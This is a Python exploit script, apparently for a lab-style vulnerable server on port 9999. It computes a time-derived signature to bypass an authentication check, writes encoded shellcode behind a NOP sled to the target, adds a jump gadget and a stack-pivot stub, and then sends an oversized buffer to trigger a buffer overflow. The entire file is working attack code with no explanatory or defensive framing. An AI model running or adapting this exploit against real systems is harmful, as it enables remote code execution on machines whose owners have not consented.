import socket
import struct
import sys
import time

target = sys.argv[1]

def write_into_file1():
    shellcode =  b"\x90"*30
    shellcode += b"\xda\xc5\xbe\xe9\xee\x21\xb5\xd9\x74\x24\xf4"
    shellcode += b"\x58\x33\xc9\xb1\x31\x31\x70\x18\x83\xe8\xfc"
    shellcode += b"\x03\x70\xfd\x0c\xd4\x49\x15\x52\x17\xb2\xe5"
    shellcode += b"\x33\x91\x57\xd4\x73\xc5\x1c\x46\x44\x8d\x71"
    shellcode += b"\x6a\x2f\xc3\x61\xf9\x5d\xcc\x86\x4a\xeb\x2a"
    shellcode += b"\xa8\x4b\x40\x0e\xab\xcf\x9b\x43\x0b\xee\x53"
    shellcode += b"\x96\x4a\x37\x89\x5b\x1e\xe0\xc5\xce\x8f\x85"
    shellcode += b"\x90\xd2\x24\xd5\x35\x53\xd8\xad\x34\x72\x4f"
    shellcode += b"\xa6\x6e\x54\x71\x6b\x1b\xdd\x69\x68\x26\x97"
    shellcode += b"\x02\x5a\xdc\x26\xc3\x93\x1d\x84\x2a\x1c\xec"
    shellcode += b"\xd4\x6b\x9a\x0f\xa3\x85\xd9\xb2\xb4\x51\xa0"
    shellcode += b"\x68\x30\x42\x02\xfa\xe2\xae\xb3\x2f\x74\x24"
    shellcode += b"\xbf\x84\xf2\x62\xa3\x1b\xd6\x18\xdf\x90\xd9"
    shellcode += b"\xce\x56\xe2\xfd\xca\x33\xb0\x9c\x4b\x99\x17"
    shellcode += b"\xa0\x8c\x42\xc7\x04\xc6\x6e\x1c\x35\x85\xe4"
    shellcode += b"\xe3\xcb\xb3\x4a\xe3\xd3\xbb\xfa\x8c\xe2\x30"
    shellcode += b"\x95\xcb\xfa\x92\xd2\x24\xb1\xbf\x72\xad\x1c"
    shellcode += b"\x2a\xc7\xb0\x9e\x80\x0b\xcd\x1c\x21\xf3\x2a"
    shellcode += b"\x3c\x40\xf6\x77\xfa\xb8\x8a\xe8\x6f\xbf\x39"
    shellcode += b"\x08\xba\xdc\xdc\x9a\x26\x0d\x7b\x1b\xcc\x51"

    c = calculate_offset()
    print(f"[!] Signature: {hex(c)}")
    buf = struct.pack("<L",c) + b"\x01\x00\x00\x00" + b"\x90"*50 + shellcode + b"A"*(3000-50-len(shellcode))

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,9999))
    s.send(buf)
    print(s.recv(1024))
    s.close()

def write_into_file2():
    #bad_chars = \x0a\x1a
    c = calculate_offset()
    print(f"[!] Signature: {hex(c)}")
    buf = struct.pack("<L",c) + b"\x01\x00\x00\x00" + b"B"*128
    buf += b"\x90\x90\xeb\x05\x90"
    buf += struct.pack("<L",0x60ae1b2b)
    buf += b"\x90\x90\x66\x81\xC4\x41\x07\xff\xe4"
    buf += b"D"*(100)

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,9999))
    s.send(buf)
    print(s.recv(1024))
    s.close()

def clear_file():
    c = calculate_offset()
    print(f"[!] Signature: {hex(c)}")
    buf = struct.pack("<L",c) + b"\x03\x00\x00\x00" + b"A"*10

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,9999))
    s.send(buf)
    print(s.recv(1024))
    s.close()


def calculate_offset():
    a = int(time.time())+48605
    print(hex(a))
    t = hex(int(a/0x0a))
    
    t1 = t
    t2 = int(t1[-2:],16)
    
    t5 = t2**2
    t3 = t2**3
    t4 = t2**4

    t3 = hex(t3 & 0xffffff00)
    t3 = "0x" + hex(int(t3,16) << 4)[2:].zfill(8)[-8:]
    t3 = hex(int(t3,16) | t5)
    t3 = hex(int(t3,16) & 0xfffffff0)
    
    print(f"[!] EDX final: {t3}")
    t4 = t4 & 0xfffff000
    t4 = "0x" + hex(t4 << 8)[2:].zfill(8)[-8:]
    
    print(f"[!] ECX Final: {t4}")
    t3 = int(t3,16) | int(t4,16)
    t3 = "0x" + hex(t3 << 4)[2:].zfill(8)[-8:]
    t3 = int(t3,16) | t2
    t3 = t3 ^ 0x74829726

    return t3
    
target = sys.argv[1]

clear_file()
write_into_file1()
write_into_file2()
c = calculate_offset()
print(f"[!] Signature: {hex(c)}")
buf = struct.pack("<L",c) + b"\x02\x00\x00\x00" + b"C"*3000

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,9999))
s.send(buf)
print(s.recv(1024))
s.close()
